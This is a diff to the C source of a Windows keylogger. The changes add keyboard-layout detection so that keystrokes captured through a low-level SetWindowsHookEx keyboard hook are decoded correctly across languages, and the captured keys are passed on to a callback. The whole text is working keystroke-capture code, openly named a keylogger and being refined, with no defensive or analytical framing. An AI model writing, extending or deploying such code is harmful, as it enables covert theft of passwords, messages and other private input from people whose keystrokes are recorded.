@@ -1,10 +1,12 @@
 #include "keylogger.h"
+#include "dictionary.h"
 
 keyloggerCallback callback;
 HHOOK keyboardHook = NULL;
 
 u8 lShiftPressed = 0, rShiftPressed = 0, keyAfterShift = 1;
 char chr[65] = {0};
+HKL lastKeyboardLayout;
 
 void toUpperCase(char* buffer) {
     u32 len = strlen(buffer);
@@ -94,6 +96,11 @@ void dictionary(u32 key) {
 
 LRESULT CALLBACK keyloggerHook(int code, WPARAM wParam, LPARAM lParam) {
     if (code == HC_ACTION) {
+        HKL currentKeyboardLayout = GetKeyboardLayout(NULL);
+        if (lastKeyboardLayout != currentKeyboardLayout) {
+            lastKeyboardLayout = currentKeyboardLayout;
+            constructKeyDictionary();
+        }
         KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*) lParam;
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             if (key->vkCode == VK_LSHIFT) {
@@ -128,6 +135,8 @@ LRESULT CALLBACK keyloggerHook(int code, WPARAM wParam, LPARAM lParam) {
 }
 
 void startKeylogger(HINSTANCE hInstance, keyloggerCallback cb) {
+    lastKeyboardLayout = GetKeyboardLayout(NULL);
+    constructKeyDictionary();
     callback = cb;
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyloggerHook, hInstance, NULL);
     MSG msg;
